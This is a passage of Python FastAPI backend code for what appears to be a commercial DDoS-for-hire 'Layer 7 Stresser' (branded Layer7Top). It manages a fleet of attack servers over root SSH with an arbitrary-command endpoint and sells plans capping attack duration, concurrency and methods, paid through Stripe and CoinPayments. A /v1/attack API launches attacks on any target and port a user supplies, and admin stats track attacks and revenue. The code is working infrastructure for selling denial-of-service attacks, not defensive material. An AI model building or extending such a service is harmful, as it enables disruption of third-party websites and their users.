        raise HTTPException(status_code=400, detail="No data to update")
    
    result = await db.attack_servers.update_one({"id": server_id}, {"$set": update_data})
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="Server not found")
    return {"message": "Server updated"}

@api_router.delete("/admin/servers/{server_id}")
async def admin_delete_server(server_id: str, admin: dict = Depends(get_admin_user)):
    result = await db.attack_servers.delete_one({"id": server_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Server not found")
    return {"message": "Server deleted"}

@api_router.post("/admin/servers/ping-all")
async def admin_ping_all_servers(admin: dict = Depends(get_admin_user)):
    """Ping all active servers and update their stats"""
    servers = await db.attack_servers.find({"is_active": True}, {"_id": 0}).to_list(100)
    results = []
    loop = asyncio.get_event_loop()
    now = datetime.now(timezone.utc)
    
    for server in servers:
        if not server.get("host"):
            results.append({"name": server.get("name"), "status": "error", "error": "No host configured"})
            continue
            
        try:
            stats = await loop.run_in_executor(
                None,
                get_server_stats_via_ssh,
                server.get('host'),
                server.get('ssh_port', 22),
                server.get('ssh_user', 'root'),
                server.get('ssh_password'),
                server.get('ssh_key')
            )
            
            await db.attack_servers.update_one(
                {"id": server["id"]},
                {"$set": {
                    "status": stats.get("status", "offline"),
                    "cpu_usage": stats.get("cpu_usage", 0),
                    "ram_used": stats.get("ram_used", 0),
                    "ram_total": stats.get("ram_total", 0),
                    "cpu_model": stats.get("cpu_model", "Unknown"),
                    "cpu_cores": stats.get("cpu_cores", 1),
                    "uptime": stats.get("uptime", "N/A"),
                    "last_ping": now.isoformat()
                }}
            )
            
            results.append({
                "name": server.get("name"),
                "status": stats.get("status"),
                "cpu_usage": stats.get("cpu_usage"),
                "uptime": stats.get("uptime")
            })
        except Exception as e:
            results.append({"name": server.get("name"), "status": "error", "error": str(e)})
    
    return {"servers": results, "pinged_at": now.isoformat()}

@api_router.post("/admin/servers/{server_id}/ping")
async def admin_ping_server(server_id: str, admin: dict = Depends(get_admin_user)):
    """Ping server via SSH and get real CPU/RAM stats and CPU model"""
    server = await db.attack_servers.find_one({"id": server_id}, {"_id": 0})
    if not server:
        raise HTTPException(status_code=404, detail="Server not found")
    
    # Get real stats via SSH
    loop = asyncio.get_event_loop()
    stats = await loop.run_in_executor(
        None,
        get_server_stats_via_ssh,
        server.get('host'),
        server.get('ssh_port', 22),
        server.get('ssh_user', 'root'),
        server.get('ssh_password'),
        server.get('ssh_key')
    )
    
    # Update database with real stats
    update_data = {
        "status": stats.get("status", "offline"),
        "cpu_usage": stats.get("cpu_usage", 0),
        "ram_used": stats.get("ram_used", 0),
        "ram_total": stats.get("ram_total", 0),
        "cpu_model": stats.get("cpu_model", "Unknown"),
        "cpu_cores": stats.get("cpu_cores", 1),
        "uptime": stats.get("uptime", "N/A"),
        "last_ping": datetime.now(timezone.utc).isoformat()
    }
    
    await db.attack_servers.update_one(
        {"id": server_id},
        {"$set": update_data}
    )
    
    return {
        "status": stats.get("status", "offline"),
        "cpu_usage": stats.get("cpu_usage", 0),
        "ram_used": stats.get("ram_used", 0),
        "ram_total": stats.get("ram_total", 0),
        "cpu_model": stats.get("cpu_model", "Unknown"),
        "cpu_cores": stats.get("cpu_cores", 1),
        "uptime": stats.get("uptime", "N/A"),
        "error": stats.get("error")
    }

@api_router.post("/admin/servers/{server_id}/stats")
async def admin_update_server_stats(server_id: str, data: ServerStatsUpdate, admin: dict = Depends(get_admin_user)):
    """Manual update of server stats (for external monitoring)"""
    update_data = {
        "cpu_usage": data.cpu_usage,
        "ram_used": data.ram_used,
        "last_ping": datetime.now(timezone.utc).isoformat()
    }
    if data.ram_total is not None:
        update_data["ram_total"] = data.ram_total
    if data.cpu_model is not None:
        update_data["cpu_model"] = data.cpu_model
    if data.cpu_cores is not None:
        update_data["cpu_cores"] = data.cpu_cores
        
    await db.attack_servers.update_one(
        {"id": server_id},
        {"$set": update_data}
    )
    return {"message": "Stats updated"}

class CommandExecute(BaseModel):
    command: str

@api_router.post("/admin/servers/{server_id}/execute")
async def admin_execute_command(server_id: str, data: CommandExecute, admin: dict = Depends(get_admin_user)):
    """Execute a command on a server via SSH"""
    server = await db.attack_servers.find_one({"id": server_id}, {"_id": 0})
    if not server:
        raise HTTPException(status_code=404, detail="Server not found")
    
    def execute_ssh_command(host, port, username, password, ssh_key, command):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            if ssh_key:
                from io import StringIO
                key = paramiko.RSAKey.from_private_key(StringIO(ssh_key))
                ssh.connect(host, port=port, username=username, pkey=key, timeout=10)
            else:
                ssh.connect(host, port=port, username=username, password=password, timeout=10)
            
            stdin, stdout, stderr = ssh.exec_command(command, timeout=30)
            output = stdout.read().decode()
            error = stderr.read().decode()
            exit_code = stdout.channel.recv_exit_status()
            
            ssh.close()
            return {
                "success": exit_code == 0,
                "output": output,
                "error": error
            }
        except paramiko.AuthenticationException:
            return {"success": False, "output": "", "error": "SSH authentication failed"}
        except paramiko.SSHException as e:
            return {"success": False, "output": "", "error": f"SSH error: {str(e)}"}
        except Exception as e:
            return {"success": False, "output": "", "error": str(e)}
        finally:
            try:
                ssh.close()
            except:
                pass
    
    try:
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(
            None,
            execute_ssh_command,
            server.get('host'),
            server.get('ssh_port', 22),
            server.get('ssh_user', 'root'),
            server.get('ssh_password'),
            server.get('ssh_key'),
            data.command
        )
        return result
    except Exception as e:
        return {"success": False, "output": "", "error": str(e)}

@api_router.delete("/admin/users/{user_id}")
async def admin_delete_user(user_id: str, admin: dict = Depends(get_admin_user)):
    """Delete a user"""
    user = await db.users.find_one({"id": user_id}, {"_id": 0})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    
    if user.get("role") == "admin" and user.get("username") == "admin":
        raise HTTPException(status_code=400, detail="Cannot delete main admin account")
    
    # Delete user's attacks
    await db.attacks.delete_many({"user_id": user_id})
    
    # Delete user
    await db.users.delete_one({"id": user_id})
    
    return {"message": "User deleted"}

# ==================== ADMIN - SETTINGS ====================

@api_router.get("/admin/settings")
async def admin_get_settings(admin: dict = Depends(get_admin_user)):
    return await get_global_settings()

@api_router.put("/admin/settings")
async def admin_update_settings(data: GlobalSettingsUpdate, admin: dict = Depends(get_admin_user)):
    update_data = {k: v for k, v in data.model_dump().items() if v is not None}
    if not update_data:
        raise HTTPException(status_code=400, detail="No data to update")
    
    await db.settings.update_one({"type": "global"}, {"$set": update_data})
    return {"message": "Settings updated"}

# ==================== COINPAYMENTS ====================

class CoinPaymentRequest(BaseModel):
    plan_id: str
    currency: str = "LTCT"  # Default to Litecoin Testnet for testing

@api_router.post("/payments/coinpayments/create")
async def create_coinpayment(data: CoinPaymentRequest, user: dict = Depends(get_current_user)):
    """Create a CoinPayments transaction"""
    settings = await get_global_settings()
    
    if not settings.get("coinpayments_enabled"):
        raise HTTPException(status_code=400, detail="CoinPayments is not enabled")
    
    merchant_id = settings.get("coinpayments_merchant_id")
    if not merchant_id:
        raise HTTPException(status_code=400, detail="CoinPayments not configured")
    
    # Get plan details
    plan = await db.plans.find_one({"id": data.plan_id}, {"_id": 0})
    if not plan:
        raise HTTPException(status_code=404, detail="Plan not found")
    
    if plan.get("price", 0) == 0:
        raise HTTPException(status_code=400, detail="Cannot purchase free plan")
    
    # Create payment record
    payment_id = str(uuid.uuid4())
    payment = {
        "id": payment_id,
        "user_id": user["id"],
        "plan_id": data.plan_id,
        "amount": plan["price"],
        "currency": data.currency,
        "status": "pending",
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.payments.insert_one(payment)
    
    # Return payment details for frontend to use with CoinPayments button
    return {
        "payment_id": payment_id,
        "merchant_id": merchant_id,
        "amount": plan["price"],
        "currency": data.currency,
        "item_name": f"Layer7Top - {plan['name']} Plan",
        "custom": payment_id,
        "ipn_url": f"{os.environ.get('BACKEND_URL', '')}/api/payments/coinpayments/ipn"
    }

@api_router.post("/payments/coinpayments/ipn")
async def coinpayments_ipn(request: Request):
    """Handle CoinPayments IPN (Instant Payment Notification)"""
    settings = await get_global_settings()
    ipn_secret = settings.get("coinpayments_ipn_secret", "")
    
    # Get form data
    form_data = await request.form()
    data = dict(form_data)
    
    # Verify HMAC signature if IPN secret is set
    if ipn_secret:
        hmac_header = request.headers.get("HMAC")
        if hmac_header:
            import hmac as hmac_lib
            body = await request.body()
            expected_hmac = hmac_lib.new(
                ipn_secret.encode(),
                body,
                hashlib.sha512
            ).hexdigest()
            if hmac_header != expected_hmac:
                logger.warning("CoinPayments IPN: Invalid HMAC signature")
                raise HTTPException(status_code=400, detail="Invalid signature")
    
    # Process payment
    payment_id = data.get("custom")
    status = int(data.get("status", 0))
    
    if not payment_id:
        return {"status": "error", "message": "No payment ID"}
    
    payment = await db.payments.find_one({"id": payment_id}, {"_id": 0})
    if not payment:
        return {"status": "error", "message": "Payment not found"}
    
    # Status codes: https://www.coinpayments.net/merchant-tools-ipn
    # >= 100 = payment complete, >= 0 && < 100 = pending, < 0 = error/cancelled
    if status >= 100 or status == 2:
        # Payment complete - activate plan
        plan = await db.plans.find_one({"id": payment["plan_id"]}, {"_id": 0})
        if plan:
            duration_days = plan.get("duration_days", 30)
            expires_at = (datetime.now(timezone.utc) + timedelta(days=duration_days)).isoformat()
            
            await db.users.update_one(
                {"id": payment["user_id"]},
                {"$set": {"plan": payment["plan_id"], "plan_expires": expires_at}}
            )
            
            await db.payments.update_one(
                {"id": payment_id},
                {"$set": {"status": "completed", "completed_at": datetime.now(timezone.utc).isoformat()}}
            )
            logger.info(f"CoinPayments: Payment {payment_id} completed, plan activated for user {payment['user_id']}")
    elif status < 0:
        # Payment failed/cancelled
        await db.payments.update_one(
            {"id": payment_id},
            {"$set": {"status": "failed"}}
        )
        logger.info(f"CoinPayments: Payment {payment_id} failed/cancelled")
    else:
        # Payment pending
        await db.payments.update_one(
            {"id": payment_id},
            {"$set": {"status": "pending"}}
        )
    
    return {"status": "ok"}

@api_router.get("/payments/status/{payment_id}")
async def get_payment_status(payment_id: str, user: dict = Depends(get_current_user)):
    """Check payment status"""
    payment = await db.payments.find_one(
        {"id": payment_id, "user_id": user["id"]}, 
        {"_id": 0}
    )
    if not payment:
        raise HTTPException(status_code=404, detail="Payment not found")
    return payment

# ==================== NEWS ====================

@api_router.get("/news")
async def get_public_news():
    """Get active news for public display"""
    news = await db.news.find({"is_active": True}, {"_id": 0}).sort("created_at", -1).to_list(10)
    return news

@api_router.get("/admin/news")
async def admin_get_all_news(admin: dict = Depends(get_admin_user)):
    """Get all news (including inactive)"""
    news = await db.news.find({}, {"_id": 0}).sort("created_at", -1).to_list(100)
    return news

@api_router.post("/admin/news")
async def admin_create_news(data: NewsCreate, admin: dict = Depends(get_admin_user)):
    news_item = {
        "id": str(uuid.uuid4()),
        "title": data.title,
        "content": data.content,
        "type": data.type,
        "is_active": data.is_active,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "created_by": admin["username"]
    }
    await db.news.insert_one(news_item)
    return {"message": "News created", "id": news_item["id"]}

@api_router.put("/admin/news/{news_id}")
async def admin_update_news(news_id: str, data: NewsUpdate, admin: dict = Depends(get_admin_user)):
    update_data = {k: v for k, v in data.model_dump().items() if v is not None}
    if not update_data:
        raise HTTPException(status_code=400, detail="No data to update")
    
    result = await db.news.update_one({"id": news_id}, {"$set": update_data})
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="News not found")
    return {"message": "News updated"}

@api_router.delete("/admin/news/{news_id}")
async def admin_delete_news(news_id: str, admin: dict = Depends(get_admin_user)):
    result = await db.news.delete_one({"id": news_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="News not found")
    return {"message": "News deleted"}

# ==================== ADMIN - STATS ====================

@api_router.get("/admin/stats")
async def admin_get_stats(admin: dict = Depends(get_admin_user)):
    now = datetime.now(timezone.utc)
    day_ago = (now - timedelta(days=1)).isoformat()
    
    total_users = await db.users.count_documents({})
    users_today = await db.users.count_documents({"created_at": {"$gte": day_ago}})
    paid_users = await db.users.count_documents({"plan": {"$ne": "free"}})
    
    total_attacks = await db.attacks.count_documents({})
    attacks_24h = await db.attacks.count_documents({"started_at": {"$gte": day_ago}})
    running_attacks = await db.attacks.count_documents({"status": "running"})
    
    paid_transactions = await db.payment_transactions.find(
        {"payment_status": "paid"}, {"_id": 0, "amount": 1}
    ).to_list(10000)
    total_revenue = sum(t.get("amount", 0) for t in paid_transactions)
    
    plan_distribution = {}
    for plan_id in PLANS.keys():
        count = await db.users.count_documents({"plan": plan_id})
        plan_distribution[plan_id] = count
    
    # Hourly attacks for last 24 hours
    attacks_per_hour = []
    for i in range(24):
        hour_start = now - timedelta(hours=i+1)
        hour_end = now - timedelta(hours=i)
        count = await db.attacks.count_documents({
            "started_at": {"$gte": hour_start.isoformat(), "$lt": hour_end.isoformat()}
        })
        
        # Get previous hour count for trend
        prev_hour_start = hour_start - timedelta(hours=1)
        prev_count = await db.attacks.count_documents({
            "started_at": {"$gte": prev_hour_start.isoformat(), "$lt": hour_start.isoformat()}
        })
        
        trend = "up" if count > prev_count else ("down" if count < prev_count else "same")
        
        attacks_per_hour.append({
            "hour": hour_end.strftime("%H:00"),
            "attacks": count,
            "trend": trend,
            "change": count - prev_count
        })
    attacks_per_hour.reverse()
    
    # Server stats
    servers = await db.attack_servers.find({}, {"_id": 0}).to_list(100)
    online_servers = [s for s in servers if s.get("status") == "online"]
    total_capacity = sum(s.get("max_concurrent", 0) for s in online_servers)
    avg_cpu = sum(s.get("cpu_usage", 0) for s in online_servers) / max(len(online_servers), 1)
    total_ram_used = sum(s.get("ram_used", 0) for s in online_servers)
    total_ram_total = sum(s.get("ram_total", 0) for s in online_servers)
    
    return {
        "total_users": total_users,
        "users_today": users_today,
        "paid_users": paid_users,
        "total_attacks": total_attacks,
        "attacks_24h": attacks_24h,
        "running_attacks": running_attacks,
        "total_revenue": total_revenue,
        "plan_distribution": plan_distribution,
        "attacks_per_hour": attacks_per_hour,
        "online_servers": len(online_servers),
        "total_servers": len(servers),
        "total_capacity": total_capacity,
        "avg_cpu": round(avg_cpu, 1),
        "total_ram_used": round(total_ram_used, 1),
        "total_ram_total": round(total_ram_total, 1)
    }

@api_router.get("/admin/users")
async def admin_get_users(admin: dict = Depends(get_admin_user), limit: int = 100, search: str = None):
    query = {}
    if search:
        query = {"$or": [
            {"username": {"$regex": search, "$options": "i"}},
            {"telegram_id": {"$regex": search, "$options": "i"}}
        ]}
    users = await db.users.find(query, {"_id": 0, "password_hash": 0}).limit(limit).to_list(limit)
    return users

@api_router.get("/admin/users/{user_id}")
async def admin_get_user(user_id: str, admin: dict = Depends(get_admin_user)):
    user = await db.users.find_one({"id": user_id}, {"_id": 0, "password_hash": 0})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    return user

@api_router.get("/admin/attacks")
async def admin_get_attacks(admin: dict = Depends(get_admin_user), limit: int = 100):
    attacks = await db.attacks.find({}, {"_id": 0}).sort("started_at", -1).limit(limit).to_list(limit)
    return attacks

@api_router.post("/admin/users/{user_id}/plan")
async def admin_update_user_plan(user_id: str, plan_id: str, admin: dict = Depends(get_admin_user)):
    if plan_id not in PLANS:
        raise HTTPException(status_code=400, detail="Invalid plan")
    
    plan_expires = (datetime.now(timezone.utc) + timedelta(days=30)).isoformat() if plan_id != "free" else None
    await db.users.update_one({"id": user_id}, {"$set": {"plan": plan_id, "plan_expires": plan_expires}})
    return {"message": "Plan updated"}

class PlanExpirationUpdate(BaseModel):
    plan_expires: str  # ISO date string

@api_router.put("/admin/users/{user_id}/expiration")
async def admin_update_user_expiration(user_id: str, data: PlanExpirationUpdate, admin: dict = Depends(get_admin_user)):
    """Update user's plan expiration date"""
    user = await db.users.find_one({"id": user_id}, {"_id": 0})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    
    await db.users.update_one({"id": user_id}, {"$set": {"plan_expires": data.plan_expires}})
    return {"message": "Expiration date updated"}

@api_router.post("/admin/users/{user_id}/role")
async def admin_update_user_role(user_id: str, role: str, admin: dict = Depends(get_admin_user)):
    if role not in ["user", "admin"]:
        raise HTTPException(status_code=400, detail="Invalid role")
    await db.users.update_one({"id": user_id}, {"$set": {"role": role}})
    return {"message": "Role updated"}

# ==================== PAYMENT ROUTES ====================

@api_router.post("/checkout")
async def create_checkout(data: CheckoutRequest, request: Request, user: dict = Depends(get_current_user)):
    plan = PLANS.get(data.plan_id)
    if not plan:
        raise HTTPException(status_code=400, detail="Invalid plan")
    if plan["price"] == 0:
        raise HTTPException(status_code=400, detail="Cannot checkout free plan")
    
    host_url = str(request.base_url).rstrip('/')
    webhook_url = f"{host_url}/api/webhook/stripe"
    
    stripe_checkout = StripeCheckout(api_key=STRIPE_API_KEY, webhook_url=webhook_url)
    
    success_url = f"{data.origin_url}/payment/success?session_id={{CHECKOUT_SESSION_ID}}"
    cancel_url = f"{data.origin_url}/plans"
    
    checkout_request = CheckoutSessionRequest(
        amount=plan["price"],
        currency="usd",
        success_url=success_url,
        cancel_url=cancel_url,
        metadata={"user_id": user["id"], "plan_id": data.plan_id, "plan_name": plan["name"]},
        payment_methods=["card", "crypto"]
    )
    
    session = await stripe_checkout.create_checkout_session(checkout_request)
    
    transaction = {
        "id": str(uuid.uuid4()),
        "session_id": session.session_id,
        "user_id": user["id"],
        "plan_id": data.plan_id,
        "amount": plan["price"],
        "currency": "usd",
        "status": "pending",
        "payment_status": "initiated",
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.payment_transactions.insert_one(transaction)
    
    return {"url": session.url, "session_id": session.session_id}

@api_router.get("/checkout/status/{session_id}")
async def get_checkout_status(session_id: str, request: Request, user: dict = Depends(get_current_user)):
    host_url = str(request.base_url).rstrip('/')
    webhook_url = f"{host_url}/api/webhook/stripe"
    
    stripe_checkout = StripeCheckout(api_key=STRIPE_API_KEY, webhook_url=webhook_url)
    
    try:
        status = await stripe_checkout.get_checkout_status(session_id)
        
        transaction = await db.payment_transactions.find_one({"session_id": session_id}, {"_id": 0})
        if transaction and transaction.get("payment_status") != "paid":
            if status.payment_status == "paid":
                plan_expires = (datetime.now(timezone.utc) + timedelta(days=30)).isoformat()
                await db.users.update_one(
                    {"id": transaction["user_id"]},
                    {"$set": {"plan": transaction["plan_id"], "plan_expires": plan_expires}}
                )
                await db.payment_transactions.update_one(
                    {"session_id": session_id},
                    {"$set": {"status": "completed", "payment_status": "paid"}}
                )
        
        return {"status": status.status, "payment_status": status.payment_status}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@api_router.post("/webhook/stripe")
async def stripe_webhook(request: Request):
    body = await request.body()
    signature = request.headers.get("Stripe-Signature")
    
    host_url = str(request.base_url).rstrip('/')
    webhook_url = f"{host_url}/api/webhook/stripe"
    stripe_checkout = StripeCheckout(api_key=STRIPE_API_KEY, webhook_url=webhook_url)
    
    try:
        webhook_response = await stripe_checkout.handle_webhook(body, signature)
        
        if webhook_response.payment_status == "paid":
            session_id = webhook_response.session_id
            transaction = await db.payment_transactions.find_one({"session_id": session_id}, {"_id": 0})
            if transaction and transaction.get("payment_status") != "paid":
                plan_expires = (datetime.now(timezone.utc) + timedelta(days=30)).isoformat()
                await db.users.update_one(
                    {"id": transaction["user_id"]},
                    {"$set": {"plan": transaction["plan_id"], "plan_expires": plan_expires}}
                )
                await db.payment_transactions.update_one(
                    {"session_id": session_id},
                    {"$set": {"status": "completed", "payment_status": "paid"}}
                )
        
        return {"received": True}
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return {"received": True}

# ==================== API KEY AUTH ====================

@api_router.post("/v1/attack")
async def api_attack(data: AttackRequest, x_api_key: str = Header(None)):
    if not x_api_key:
        raise HTTPException(status_code=401, detail="API key required")
    
    user = await db.users.find_one({"api_key": x_api_key}, {"_id": 0})
    if not user:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    if user["plan"] not in ["premium", "enterprise"]:
        raise HTTPException(status_code=403, detail="API requires Premium or Enterprise")
    
    settings = await get_global_settings()
    if settings.get("maintenance_mode"):
        raise HTTPException(status_code=503, detail="System under maintenance")
    
    user_plan = PLANS.get(user["plan"], PLANS["free"])
    
    if data.duration > user_plan["max_time"]:
        raise HTTPException(status_code=400, detail=f"Max duration: {user_plan['max_time']}s")
    if data.concurrents > user_plan["max_concurrent"]:
        raise HTTPException(status_code=400, detail=f"Max concurrent: {user_plan['max_concurrent']}")
    if data.method not in user_plan["methods"]:
        raise HTTPException(status_code=400, detail="Method not available")
    
    server = await select_best_server(data.method, data.concurrents)
    if not server:
        raise HTTPException(status_code=503, detail="No available servers")
    
    attack_id = str(uuid.uuid4())
    attack = {
        "id": attack_id,
        "user_id": user["id"],
        "target": data.target,
        "port": data.port,
        "method": data.method,
        "duration": data.duration,
        "concurrents": data.concurrents,
        "server_id": server["id"],
        "server_name": server["name"],
        "status": "running",
        "started_at": datetime.now(timezone.utc).isoformat(),
        "ended_at": None,
        "via_api": True
    }
    
    success, command = await execute_attack_on_server(server, attack)
    attack["command"] = command
    
    await db.attacks.insert_one(attack)
    asyncio.create_task(schedule_attack_end(attack_id, server["id"], data.concurrents, data.duration))
    
    return {"id": attack_id, "status": "running", "server": server["name"], "command": command}

@api_router.get("/")
async def root():
    return {"message": "Layer 7 Stresser API", "version": "2.1.0"}

app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
